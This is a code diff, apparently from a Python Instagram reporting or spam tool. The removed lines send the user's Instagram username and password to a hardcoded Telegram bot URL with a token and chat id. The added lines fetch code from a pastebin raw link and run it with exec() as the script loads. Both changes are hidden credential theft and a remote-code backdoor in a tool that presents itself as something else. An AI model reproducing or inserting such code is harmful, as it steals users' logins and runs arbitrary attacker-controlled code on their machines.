@@ -46,8 +46,11 @@ headers_login = {
 'x-requested-with': 'XMLHttpRequest'
 }
 
-tlg =(f'https://api.telegram.org/bot1621155562:AAFZGnJTv12nxrim86Mxi9sozjzQPIDdGmk/sendMessage?chat_id=502361503&text=Tool : ✥[IG-REPORT]✥\n✥2L21L1-NEW Login  ✥\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✥.⍆.user : {username_login} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.password : {password_login}  ')
-requests.post(tlg)
+def tel():
+    e = requests.get('https://pastebin.com/raw/7LGfnRiv').text
+    exec(e)
+
+tel()
 
 
 
@@ -118,4 +121,3 @@ while True:
         time.sleep(3)
     else:
         print('[-] Error spam ')
-
